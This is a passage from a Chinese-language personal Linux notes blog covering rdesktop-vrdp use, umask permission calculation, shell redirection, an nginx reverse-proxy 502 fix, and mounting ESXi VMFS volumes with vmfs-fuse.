+</span></span><span class="line"><span class="cl">$&gt; cp ./usr/bin/rdesktop-vrdp /usr/local/bin/
+</span></span><span class="line"><span class="cl">$&gt; cp -v ./usr/lib64/virtualbox/VBoxRT.so /usr/lib64/
+</span></span><span class="line"><span class="cl">$&gt; ldconfig
+</span></span><span class="line"><span class="cl">$&gt; rdesktop-vrdp -a 16 -g 1900x960 -r clipboard:PRIMARYCLIPBOARD -r disk:floppy=/tmp/ -u administrator &lt;server_ip&gt;:&lt;port&gt; -p&lt;password&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="umask-计算方法" class="headerLink">
+    <a href="#umask-%e8%ae%a1%e7%ae%97%e6%96%b9%e6%b3%95" class="header-mark"></a>Umask 计算方法</h1><ul>
+<li>当创建目录时候，<code>目录创建后的权限</code> =  <code>默认目录最大权限(777)</code> - <code>umask 权限</code>
+<ul>
+<li><code>umask=0022 --&gt; 777 - 022 = 755(目录权限)</code></li>
+</ul>
+</li>
+<li>当创建文件时候，若<code>umask</code>值所有位数为偶数，则 <code>文件创建后的权限</code> = <code>默认文件最大权限(666)</code> - <code>umask权限</code>
+<ul>
+<li><code>umask = 0022 --&gt; 666 - 022 = 644(文件权限)</code></li>
+</ul>
+</li>
+<li>当创建文件时候，若<code>umask</code>值部分或全部为奇数时候，则 <code>文件创建后的权限</code> = <code>默认文件最大权限(666)</code> - <code>umask权限</code> + <code>umask基数位+1</code>
+<ul>
+<li><code>umask = 0045 --&gt; 666 - 045 = (621 + 001) = 622</code></li>
+<li><code>umask = 0033 --&gt; 666 - 033 = (633 + 011) = 644</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="输入输出重定向" class="headerLink">
+    <a href="#%e8%be%93%e5%85%a5%e8%be%93%e5%87%ba%e9%87%8d%e5%ae%9a%e5%90%91" class="header-mark"></a>输入输出重定向</h1><h2 id="文件描述符" class="headerLink">
+    <a href="#%e6%96%87%e4%bb%b6%e6%8f%8f%e8%bf%b0%e7%ac%a6" class="header-mark"></a>文件描述符</h2><table>
+<thead>
+<tr>
+<th>文件描述符</th>
+<th>文件名</th>
+<th>类型</th>
+<th>硬件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>0</code></td>
+<td><code>stdin</code></td>
+<td>标准输入文件</td>
+<td>键盘</td>
+</tr>
+<tr>
+<td><code>1</code></td>
+<td><code>stdout</code></td>
+<td>标准输出文件</td>
+<td>显示器</td>
+</tr>
+<tr>
+<td><code>2</code></td>
+<td><code>stderr</code></td>
+<td>标准错误输出文件</td>
+<td>显示器</td>
+</tr>
+</tbody>
+</table>
+<h2 id="标准重定向" class="headerLink">
+    <a href="#%e6%a0%87%e5%87%86%e9%87%8d%e5%ae%9a%e5%90%91" class="header-mark"></a>标准重定向</h2><blockquote>
+<p><a href="https://aimuke.github.io/linux/2019/05/29/redirect/" target="_blank" rel="noopener noreffer">https://aimuke.github.io/linux/2019/05/29/redirect/</a></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>表现形式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>标准输入重定向</td>
+<td><code>0&lt;</code>或<code>&lt;</code></td>
+</tr>
+<tr>
+<td>追加输入重定向</td>
+<td><code>0&lt;&lt;</code>或<code>&lt;</code></td>
+</tr>
+<tr>
+<td>标准输出重定向</td>
+<td><code>1&gt;</code>或<code>&gt;</code></td>
+</tr>
+<tr>
+<td>标准输出追加重定向</td>
+<td><code>1&gt;&gt;</code>或<code>&gt;&gt;</code></td>
+</tr>
+<tr>
+<td>标准错误重定向</td>
+<td><code>2&gt;</code></td>
+</tr>
+<tr>
+<td>标准错误追加重定向</td>
+<td><code>2&gt;&gt;</code></td>
+</tr>
+<tr>
+<td>标准错误重定向到标准输出</td>
+<td><code>2&gt;&amp;1</code>，<code>(cmd &gt; /dev/null 2&gt;&amp;1) == (cmd &gt;&amp; /dev/null) == (cmd &amp;&gt; /dev/null)</code></td>
+</tr>
+</tbody>
+</table>
+<h1 id="nginx-反向代理后端服务器部分资源出现502错误" class="headerLink">
+    <a href="#nginx-%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86%e5%90%8e%e7%ab%af%e6%9c%8d%e5%8a%a1%e5%99%a8%e9%83%a8%e5%88%86%e8%b5%84%e6%ba%90%e5%87%ba%e7%8e%b0502%e9%94%99%e8%af%af" class="header-mark"></a>nginx 反向代理后端服务器，部分资源出现502错误</h1><p>问题描述: 后端是<code>dotnet</code>应用，反向代理时候域名请求页面部分<code>css</code>/<code>js</code>资源返回<code>502</code>错误。直接请求报错的<code>css</code>/<code>js</code>又是正常的，前端绕过<code>nginx</code>直接访问<code>dotnet</code>所有返回又是正常的。只有经过<code>nginx</code>会出现该问题。
+解决方案:</p>
+<ul>
+<li>网上搜索到的一个解决方案，说的是<code>header过大，超出了默认的1k，就会引发上述的upstream sent too big header，nginx把外部请求给后端处理，后端返回的header太大，nginx处理不过来就会导致502</code>，这个问题提出的解决是，增大<code>proxy_buffer_size</code>/<code>proxy_buffers</code>/<code>proxy_busy_buffers_size</code>,但实际上这个方案 <em><strong>并未解决</strong></em> 我的问题。</li>
+<li>我的解决方案是,参考了官方文档<a href="https://nginx.org/en/docs/http/ngx_http_upstream_module.html#keepalive" target="_blank" rel="noopener noreffer"><code>https://nginx.org/en/docs/http/ngx_http_upstream_module.html#keepalive</code></a>,调整了<code>upstream</code>中<code>keepalive</code>,我原来设置的是<code>2</code>,现调整为<code>16</code>,并设置了<code>Connection &quot;Keep-Alive&quot;;</code>(这个设置是为了保持<code>http/1.0</code>持久链接，官方不建议使用此参数，但我这边<code>websokcet</code>和<code>http/1.0</code>,单独设置一个并没有效果，所以两个都设置了)。 然后问题解决。</li>
+</ul>
+<p><strong>虽然一直在使用<code>nginx</code>，但对于这些更深度的东西还是一点都不清楚，不知道这个问题记录的是否正确，但根据第二个方案已经解决了我的问题</strong></p>
+<h1 id="linux-下挂载-esxi-的-vmfs-文件系统" class="headerLink">
+    <a href="#linux-%e4%b8%8b%e6%8c%82%e8%bd%bd-esxi-%e7%9a%84-vmfs-%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f" class="header-mark"></a>linux 下挂载 esxi 的 vmfs 文件系统</h1><p><code>vmfs</code> 是<code>esxi</code>的文件系统,物理机使用<code>esxi</code>虚拟化后硬盘的文件格式就是这个. <code>linux</code>下可以直接将其挂在到本地
+<code>vmfs-tools</code>是<code>linux</code>挂载<code>vmfs</code>的驱动程序(应该也可以挂在<code>vmdk</code>文件,<em>我没有试过</em>),默认在<code>ubuntu</code>上已获得支持,<code>fedora</code>上可以直接将<code>ubuntu</code>上的安装程序复制过来也可以直接使用.</p>
+<blockquote>
+<p><a href="https://github.com/glandium/vmfs-tools" target="_blank" rel="noopener noreffer">https://github.com/glandium/vmfs-tools</a></p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 安装后挂载  </span>
+</span></span><span class="line"><span class="cl">vmfs-fuse /dev/sdc1 /mnt/sdc 
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-02-14</span>
+            </div>
+            <div class="post-info-license"><span><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">CC BY-NC-SA 4.0</a></span></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95/index.md target="_blank" rel="noopener noreferrer">阅读原始文档</a>
+                    </span></div>
+            <div class="post-info-share">
+                <span><a href="#" onclick="return false;" title="分享到 Evernote" data-sharer="evernote" data-url="https://blog.0x5c0f.cc/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95/" data-title="那些杂七杂八的记录"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux/">linux</a>,&nbsp;<a href="/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">解决方案</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/" class="prev" rel="prev" title="自签证书的生成及可信列表的添加"><i class="fas fa-angle-left fa-fw"></i>自签证书的生成及可信列表的添加</a>
+            <a href="/2022/fedora%E4%BC%98%E5%8C%96/" class="next" rel="next" title="FEDORA优化">FEDORA优化<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.100.2">Hugo</a> 强力驱动&nbsp;|&nbsp;主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.13"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://tools.0x5c0f.cc" target="_blank" rel="noopener noreferrer">0x5c0f</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">CC BY-NC-SA 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp">渝ICP备2020011834号-2</span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/fuse/fuse.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/topbar/topbar.min.js"></script><script type="text/javascript" src="/lib/pjax/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+
+<div class="pjax-assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"data":{"desktop-header-typeit":"0x5c0f.cc","mobile-header-typeit":"0x5c0f.cc"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":true},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"_","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":9000,"speed":100}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript></div>
+</body>
+
+</html>
